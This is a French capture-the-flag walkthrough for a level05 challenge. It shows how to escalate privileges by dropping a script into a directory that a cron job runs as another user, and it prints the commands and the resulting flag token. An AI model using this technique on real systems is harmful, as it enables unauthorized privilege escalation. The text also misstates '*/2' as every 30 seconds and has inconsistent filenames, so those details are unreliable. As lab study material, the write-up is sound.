Dès qu'on se connecte au level05, une notification apparaît:
<pre><code>You have new mail.</code></pre>

On fait un **cat** du mail reçu, qui se situe dans <code>/var/mail/level05</code> :
<pre><code>> cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
</code></pre>

Il s'agit d'une tâche **cron** dont le format est le suivant:
<pre>
*/2	*	*	*	*
minute	hour	day	month	day
</pre>
> Donc toutes les 30 secondes la tâche: <code>su -c 'sh /usr/sbin/openarenaserver"</code> va s'exécuter

On **cat** le fichier <code>/usr/sbin/openarenaserve</code>, ce qui nous donne:
```sh
#!/bin/sh
for i in /opt/openarenaserver/* ; do 
# Pour chaque fichier dans le dossier
		(ulimit -t 5; bash -x "$i")	 
		# Avec un interval de 5 sc, executer le fichier
		rm -f "$i"					 
		# Supprimer le fichier
done
```

L'idée est de créer un fichier que l'on va mettre dans le dossier <code>/opt/openarenaserver/</code> afin qu'il s'exéctue dès que la tâche **cron** s'active:
<pre><code>echo "getflag > /tmp/token" > /tmp/getflag.sh
mv /tmp/getflag.sh /opt/openarenaserver/getflash.sh
</code></pre>
> On stocke dans <code>/tmp/token</code> le resultat car **cron** s'effectue en background et n'affiche pas de message


Il nous suffit de faire des **ls** de <code>/opt/openarenaserver/</code> et d'attendre que le ficher <code>/tmp/getflag.sh</code> se fasse supprimer pour savoir quand la tâche a été effectuée, ainsi il ne nous reste plus qu'a récuperer le flag:
<pre><code>> cat /tmp/token
Check flag.Here is your token : viuaaale9huek52boumoomioc
</code></pre>